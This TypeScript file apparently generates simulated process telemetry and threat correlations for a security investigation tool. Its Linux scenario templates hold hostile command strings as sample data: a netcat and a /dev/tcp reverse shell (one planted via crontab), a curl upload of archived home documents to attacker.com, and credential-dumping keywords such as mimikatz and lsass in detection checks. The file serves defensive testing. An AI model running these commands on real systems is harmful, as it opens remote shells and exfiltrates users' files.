import { faker } from '@faker-js/faker';
import crypto from 'crypto';

export interface ProcessEntityEvent {
  entity_id: string;
  event_id: string;
  timestamp: string;
  event_type:
    | 'process_start'
    | 'process_end'
    | 'file_access'
    | 'network_connection'
    | 'registry_access';
  action: string;
  process_name: string;
  process_pid: number;
  command_line: string;
  user_name: string;
  parent_entity_id?: string;
  metadata: Record<string, any>;
}

export interface EventCorrelation {
  correlation_id: string;
  primary_entity_id: string;
  related_entity_ids: string[];
  event_sequence: ProcessEntityEvent[];
  start_time: string;
  end_time: string;
  correlation_score: number;
  threat_indicators: string[];
}

export interface VisualAnalyzerFields {
  'event.correlation.id': string;
  'event.sequence': number;
  'process.entity_id': string;
  'process.entity.investigation_id': string;
  'process.entity.correlation_score': number;
  'process.entity.timeline_position': number;
  'threat.investigation.indicators': string[];
  'investigation.session_id': string;
  'investigation.analyst_notes'?: string;
  'event.analysis.confidence': number;
  'event.analysis.priority': 'low' | 'medium' | 'high' | 'critical';
}

export class VisualEventAnalyzer {
  private investigationId: string;
  private eventSequences: Map<string, ProcessEntityEvent[]> = new Map();
  private entityCorrelations: Map<string, EventCorrelation> = new Map();
  private threatIndicators: Set<string> = new Set();
  private sessionId: string;

  constructor(investigationId?: string) {
    this.investigationId = investigationId || this.generateInvestigationId();
    this.sessionId = this.generateSessionId();
    this.initializeThreatIndicators();
  }

  /**
   * Generate unique investigation ID for tracking analysis sessions
   */
  private generateInvestigationId(): string {
    const timestamp = Date.now().toString(36);
    const random = crypto.randomBytes(6).toString('hex');
    return `investigation_${timestamp}_${random}`;
  }

  /**
   * Generate session ID for this analysis session
   */
  private generateSessionId(): string {
    return crypto.randomBytes(16).toString('hex');
  }

  /**
   * Initialize threat indicators for correlation analysis
   */
  private initializeThreatIndicators(): void {
    const indicators = [
      'suspicious_process_chain',
      'privilege_escalation_attempt',
      'lateral_movement_detected',
      'credential_access_behavior',
      'defense_evasion_technique',
      'persistence_mechanism',
      'command_and_control_activity',
      'data_exfiltration_pattern',
      'reconnaissance_activity',
      'initial_access_vector',
    ];

    indicators.forEach((indicator) => this.threatIndicators.add(indicator));
  }

  /**
   * Create a process entity event for tracking in Visual Event Analyzer
   */
  createEntityEvent(options: {
    processName: string;
    processPid: number;
    commandLine: string;
    userName: string;
    eventType?:
      | 'process_start'
      | 'process_end'
      | 'file_access'
      | 'network_connection'
      | 'registry_access';
    action?: string;
    parentEntityId?: string;
    metadata?: Record<string, any>;
  }): ProcessEntityEvent {
    const {
      processName,
      processPid,
      commandLine,
      userName,
      eventType = 'process_start',
      action = 'execute',
      parentEntityId,
      metadata = {},
    } = options;

    const timestamp = new Date().toISOString();
    const entityId = this.generateEntityId(processPid, timestamp);

    const event: ProcessEntityEvent = {
      entity_id: entityId,
      event_id: faker.string.uuid(),
      timestamp,
      event_type: eventType,
      action,
      process_name: processName,
      process_pid: processPid,
      command_line: commandLine,
      user_name: userName,
      parent_entity_id: parentEntityId,
      metadata: {
        investigation_id: this.investigationId,
        session_id: this.sessionId,
        ...metadata,
      },
    };

    // Store event in sequence
    const sequenceKey = entityId;
    if (!this.eventSequences.has(sequenceKey)) {
      this.eventSequences.set(sequenceKey, []);
    }
    this.eventSequences.get(sequenceKey)!.push(event);

    return event;
  }

  /**
   * Generate entity ID for process tracking - ECS compliant for Visual Event Analyzer
   */
  private generateEntityId(pid: number, timestamp: string): string {
    // Generate a more realistic process entity ID format
    // Format: {hostname}-{pid}-{timestamp_hash}
    const hostname = faker.internet.domainName().split('.')[0];
    const timestampHash = crypto
      .createHash('sha256')
      .update(timestamp)
      .digest('hex')
      .substring(0, 8);

    return `${hostname}-${pid}-${timestampHash}`;
  }

  /**
   * Correlate events to identify potential attack sequences
   */
  correlateEvents(events: ProcessEntityEvent[]): EventCorrelation {
    const correlationId = faker.string.uuid();
    const primaryEntityId = events[0]?.entity_id || '';

    // Extract related entity IDs
    const relatedEntityIds = events
      .map((e) => e.entity_id)
      .filter((id, index, arr) => arr.indexOf(id) === index);

    // Sort events by timestamp
    const sortedEvents = events.sort(
      (a, b) =>
        new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime(),
    );

    // Calculate correlation score based on event patterns
    const correlationScore = this.calculateCorrelationScore(sortedEvents);

    // Identify threat indicators
    const threatIndicators = this.identifyThreatIndicators(sortedEvents);

    const correlation: EventCorrelation = {
      correlation_id: correlationId,
      primary_entity_id: primaryEntityId,
      related_entity_ids: relatedEntityIds,
      event_sequence: sortedEvents,
      start_time: sortedEvents[0]?.timestamp || new Date().toISOString(),
      end_time:
        sortedEvents[sortedEvents.length - 1]?.timestamp ||
        new Date().toISOString(),
      correlation_score: correlationScore,
      threat_indicators: threatIndicators,
    };

    this.entityCorrelations.set(correlationId, correlation);
    return correlation;
  }

  /**
   * Calculate correlation score based on event patterns
   */
  private calculateCorrelationScore(events: ProcessEntityEvent[]): number {
    let score = 0.5; // Base score

    // Increase score for rapid event sequences
    if (events.length > 1) {
      const timeSpan =
        new Date(events[events.length - 1].timestamp).getTime() -
        new Date(events[0].timestamp).getTime();
      if (timeSpan < 60000) {
        // Events within 1 minute
        score += 0.2;
      }
    }

    // Increase score for suspicious process names
    const suspiciousProcesses = [
      'powershell',
      'cmd',
      'wscript',
      'rundll32',
      'regsvr32',
    ];
    const hasSuspiciousProcess = events.some((e) =>
      suspiciousProcesses.some((sp) =>
        e.process_name.toLowerCase().includes(sp),
      ),
    );
    if (hasSuspiciousProcess) {
      score += 0.1;
    }

    // Increase score for privilege escalation patterns
    const hasPrivEsc = events.some(
      (e) =>
        e.command_line.toLowerCase().includes('admin') ||
        e.command_line.toLowerCase().includes('elevated') ||
        e.user_name.toLowerCase().includes('admin'),
    );
    if (hasPrivEsc) {
      score += 0.15;
    }

    // Increase score for multiple event types
    const eventTypes = new Set(events.map((e) => e.event_type));
    if (eventTypes.size > 2) {
      score += 0.1;
    }

    return Math.min(score, 1.0); // Cap at 1.0
  }

  /**
   * Identify threat indicators in event sequence
   */
  private identifyThreatIndicators(events: ProcessEntityEvent[]): string[] {
    const indicators: string[] = [];

    // Check for suspicious process chains
    const processNames = events.map((e) => e.process_name.toLowerCase());
    if (processNames.includes('powershell') && processNames.includes('cmd')) {
      indicators.push('suspicious_process_chain');
    }

    // Check for privilege escalation
    const hasAdminActivity = events.some(
      (e) =>
        e.user_name.toLowerCase().includes('admin') ||
        e.command_line.toLowerCase().includes('runas') ||
        e.command_line.toLowerCase().includes('elevated'),
    );
    if (hasAdminActivity) {
      indicators.push('privilege_escalation_attempt');
    }

    // Check for lateral movement
    const hasNetworkActivity = events.some(
      (e) => e.event_type === 'network_connection',
    );
    const hasMultipleHosts = events.some(
      (e) =>
        e.metadata.target_host &&
        e.metadata.target_host !== e.metadata.source_host,
    );
    if (hasNetworkActivity && hasMultipleHosts) {
      indicators.push('lateral_movement_detected');
    }

    // Check for credential access
    const hasCredAccess = events.some(
      (e) =>
        e.command_line.toLowerCase().includes('lsass') ||
        e.command_line.toLowerCase().includes('mimikatz') ||
        e.command_line.toLowerCase().includes('sekurlsa') ||
        e.process_name.toLowerCase().includes('procdump'),
    );
    if (hasCredAccess) {
      indicators.push('credential_access_behavior');
    }

    // Check for defense evasion
    const hasEvasion = events.some(
      (e) =>
        e.command_line.toLowerCase().includes('hidden') ||
        e.command_line.toLowerCase().includes('encoded') ||
        e.command_line.toLowerCase().includes('bypass'),
    );
    if (hasEvasion) {
      indicators.push('defense_evasion_technique');
    }

    return indicators;
  }

  /**
   * Generate Visual Event Analyzer fields for an event
   */
  generateVisualAnalyzerFields(
    event: ProcessEntityEvent,
    correlation?: EventCorrelation,
  ): VisualAnalyzerFields {
    const correlationData = correlation || this.findCorrelationForEvent(event);
    const sequenceNumber = this.getEventSequenceNumber(event);
    const totalSequence = this.getTotalSequenceLength(event.entity_id);

    return {
      'event.correlation.id':
        correlationData?.correlation_id || faker.string.uuid(),
      'event.sequence': sequenceNumber,
      'process.entity_id': event.entity_id,
      'process.entity.investigation_id': this.investigationId,
      'process.entity.correlation_score':
        correlationData?.correlation_score || 0.5,
      'process.entity.timeline_position': this.calculateTimelinePosition(event),
      'threat.investigation.indicators':
        correlationData?.threat_indicators || [],
      'investigation.session_id': this.sessionId,
      'event.analysis.confidence': this.calculateConfidence(event),
      'event.analysis.priority': this.calculatePriority(event),
    };
  }

  /**
   * Find correlation data for a specific event
   */
  private findCorrelationForEvent(
    event: ProcessEntityEvent,
  ): EventCorrelation | undefined {
    for (const correlation of this.entityCorrelations.values()) {
      if (
        correlation.event_sequence.some((e) => e.event_id === event.event_id)
      ) {
        return correlation;
      }
    }
    return undefined;
  }

  /**
   * Get sequence number for event
   */
  private getEventSequenceNumber(event: ProcessEntityEvent): number {
    const sequence = this.eventSequences.get(event.entity_id) || [];
    return sequence.findIndex((e) => e.event_id === event.event_id) + 1;
  }

  /**
   * Get total sequence length for entity
   */
  private getTotalSequenceLength(entityId: string): number {
    return this.eventSequences.get(entityId)?.length || 1;
  }

  /**
   * Calculate timeline position (0-1) for event
   */
  private calculateTimelinePosition(event: ProcessEntityEvent): number {
    const sequence = this.eventSequences.get(event.entity_id) || [];
    if (sequence.length <= 1) return 0.5;

    const eventIndex = sequence.findIndex((e) => e.event_id === event.event_id);
    return eventIndex / (sequence.length - 1);
  }

  /**
   * Calculate analysis confidence score
   */
  private calculateConfidence(event: ProcessEntityEvent): number {
    let confidence = 0.7; // Base confidence

    // Higher confidence for known suspicious patterns
    if (
      event.command_line.includes('powershell') ||
      event.command_line.includes('cmd')
    ) {
      confidence += 0.1;
    }

    // Higher confidence for events with metadata
    if (Object.keys(event.metadata).length > 2) {
      confidence += 0.1;
    }

    // Lower confidence for very common processes
    const commonProcesses = ['explorer.exe', 'notepad.exe', 'chrome.exe'];
    if (commonProcesses.includes(event.process_name.toLowerCase())) {
      confidence -= 0.2;
    }

    return Math.max(0.1, Math.min(1.0, confidence));
  }

  /**
   * Calculate event priority for investigation
   */
  private calculatePriority(
    event: ProcessEntityEvent,
  ): 'low' | 'medium' | 'high' | 'critical' {
    const correlation = this.findCorrelationForEvent(event);
    const score = correlation?.correlation_score || 0.5;
    const threatCount = correlation?.threat_indicators.length || 0;

    if (score >= 0.8 || threatCount >= 3) {
      return 'critical';
    } else if (score >= 0.6 || threatCount >= 2) {
      return 'high';
    } else if (score >= 0.4 || threatCount >= 1) {
      return 'medium';
    } else {
      return 'low';
    }
  }

  /**
   * Generate a complete investigation timeline
   */
  generateInvestigationTimeline(): {
    investigation_id: string;
    session_id: string;
    total_events: number;
    correlations: EventCorrelation[];
    timeline_events: ProcessEntityEvent[];
    threat_summary: {
      total_indicators: number;
      critical_events: number;
      risk_score: number;
    };
  } {
    const allEvents = Array.from(this.eventSequences.values())
      .flat()
      .sort(
        (a, b) =>
          new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime(),
      );

    const criticalEvents = allEvents.filter(
      (event) => this.calculatePriority(event) === 'critical',
    ).length;

    const totalIndicators = Array.from(this.entityCorrelations.values()).reduce(
      (sum, correlation) => sum + correlation.threat_indicators.length,
      0,
    );

    const riskScore = this.calculateOverallRiskScore();

    return {
      investigation_id: this.investigationId,
      session_id: this.sessionId,
      total_events: allEvents.length,
      correlations: Array.from(this.entityCorrelations.values()),
      timeline_events: allEvents,
      threat_summary: {
        total_indicators: totalIndicators,
        critical_events: criticalEvents,
        risk_score: riskScore,
      },
    };
  }

  /**
   * Calculate overall risk score for the investigation
   */
  private calculateOverallRiskScore(): number {
    const correlations = Array.from(this.entityCorrelations.values());
    if (correlations.length === 0) return 0.3;

    const avgCorrelationScore =
      correlations.reduce((sum, c) => sum + c.correlation_score, 0) /
      correlations.length;
    const totalThreatIndicators = correlations.reduce(
      (sum, c) => sum + c.threat_indicators.length,
      0,
    );
    const indicatorScore = Math.min(totalThreatIndicators * 0.1, 0.4);

    return Math.min(avgCorrelationScore + indicatorScore, 1.0);
  }

  /**
   * Get all correlations
   */
  getAllCorrelations(): EventCorrelation[] {
    return Array.from(this.entityCorrelations.values());
  }

  /**
   * Get events for a specific entity
   */
  getEntityEvents(entityId: string): ProcessEntityEvent[] {
    return this.eventSequences.get(entityId) || [];
  }
}

// Default instance for simple usage
export const defaultVisualEventAnalyzer = new VisualEventAnalyzer();

/**
 * Generate Linux process hierarchy for Visual Event Analyzer
 * Creates realistic parent-child process relationships for Linux environments
 */
export function generateLinuxProcessHierarchy(
  options: {
    scenario?:
      | 'privilege_escalation'
      | 'lateral_movement'
      | 'persistence'
      | 'discovery'
      | 'data_exfiltration';
    depth?: number;
    hostName?: string;
    userName?: string;
    investigationId?: string;
  } = {},
): {
  events: ProcessEntityEvent[];
  visualAnalyzerFields: VisualAnalyzerFields[];
} {
  const {
    scenario = 'privilege_escalation',
    depth = 3,
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    investigationId,
  } = options;

  const analyzer = investigationId
    ? new VisualEventAnalyzer(investigationId)
    : defaultVisualEventAnalyzer;

  const events: ProcessEntityEvent[] = [];
  const visualAnalyzerFields: VisualAnalyzerFields[] = [];

  // Define Linux process chains for different scenarios
  const processChains = {
    privilege_escalation: [
      { name: 'bash', executable: '/bin/bash', cmd: '/bin/bash -i' },
      { name: 'sudo', executable: '/usr/bin/sudo', cmd: '/usr/bin/sudo -i' },
      { name: 'su', executable: '/bin/su', cmd: '/bin/su - root' },
      { name: 'bash', executable: '/bin/bash', cmd: '/bin/bash -i' },
    ],
    lateral_movement: [
      {
        name: 'ssh',
        executable: '/usr/bin/ssh',
        cmd: '/usr/bin/ssh user@remote-host',
      },
      {
        name: 'python3',
        executable: '/usr/bin/python3',
        cmd: '/usr/bin/python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
      },
      { name: 'bash', executable: '/bin/bash', cmd: '/bin/bash -i' },
      {
        name: 'nc',
        executable: '/usr/bin/nc',
        cmd: '/usr/bin/nc -e /bin/bash 192.168.1.100 4444',
      },
    ],
    persistence: [
      {
        name: 'crontab',
        executable: '/usr/bin/crontab',
        cmd: '/usr/bin/crontab -e',
      },
      {
        name: 'vim',
        executable: '/usr/bin/vim',
        cmd: '/usr/bin/vim /tmp/crontab.tmp',
      },
      {
        name: 'bash',
        executable: '/bin/bash',
        cmd: '/bin/bash -c "echo \'* * * * * /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\' >> /tmp/crontab.tmp"',
      },
      {
        name: 'crontab',
        executable: '/usr/bin/crontab',
        cmd: '/usr/bin/crontab /tmp/crontab.tmp',
      },
    ],
    discovery: [
      { name: 'ps', executable: '/bin/ps', cmd: '/bin/ps aux' },
      {
        name: 'netstat',
        executable: '/bin/netstat',
        cmd: '/bin/netstat -tulpn',
      },
      {
        name: 'find',
        executable: '/usr/bin/find',
        cmd: '/usr/bin/find / -name "*.txt" -type f 2>/dev/null',
      },
      { name: 'cat', executable: '/bin/cat', cmd: '/bin/cat /etc/passwd' },
    ],
    data_exfiltration: [
      {
        name: 'find',
        executable: '/usr/bin/find',
        cmd: '/usr/bin/find /home -name "*.doc" -o -name "*.pdf" -o -name "*.txt"',
      },
      {
        name: 'tar',
        executable: '/bin/tar',
        cmd: '/bin/tar -czf /tmp/data.tar.gz /home/user/documents/',
      },
      {
        name: 'curl',
        executable: '/usr/bin/curl',
        cmd: '/usr/bin/curl -X POST -F "file=@/tmp/data.tar.gz" http://attacker.com/upload',
      },
      { name: 'rm', executable: '/bin/rm', cmd: '/bin/rm -f /tmp/data.tar.gz' },
    ],
  };

  const chain = processChains[scenario];
  const processesToGenerate = Math.min(depth, chain.length);

  let parentEntityId: string | undefined;

  for (let i = 0; i < processesToGenerate; i++) {
    const processTemplate = chain[i];
    const processPid = faker.number.int({ min: 1000 + i * 100, max: 65535 });

    const event = analyzer.createEntityEvent({
      processName: processTemplate.name,
      processPid,
      commandLine: processTemplate.cmd,
      userName,
      eventType: 'process_start',
      action: i === 0 ? 'exec' : 'fork',
      parentEntityId,
      metadata: {
        host_name: hostName,
        scenario,
        step: i + 1,
        total_steps: processesToGenerate,
        os_family: 'linux',
        executable_path: processTemplate.executable,
      },
    });

    const fields = analyzer.generateVisualAnalyzerFields(event);

    events.push(event);
    visualAnalyzerFields.push(fields);

    // Set parent for next iteration
    parentEntityId = event.entity_id;
  }

  // Create correlation for the entire chain
  if (events.length > 1) {
    analyzer.correlateEvents(events);
  }

  return { events, visualAnalyzerFields };
}

// Factory function for creating process event with Visual Event Analyzer fields
export function createProcessEventWithVisualAnalyzer(options: {
  processName: string;
  processPid: number;
  commandLine: string;
  userName: string;
  eventType?:
    | 'process_start'
    | 'process_end'
    | 'file_access'
    | 'network_connection'
    | 'registry_access';
  action?: string;
  parentEntityId?: string;
  metadata?: Record<string, any>;
  investigationId?: string;
}): { event: ProcessEntityEvent; visualAnalyzerFields: VisualAnalyzerFields } {
  const analyzer = options.investigationId
    ? new VisualEventAnalyzer(options.investigationId)
    : defaultVisualEventAnalyzer;

  const event = analyzer.createEntityEvent(options);
  const visualAnalyzerFields = analyzer.generateVisualAnalyzerFields(event);

  return { event, visualAnalyzerFields };
}
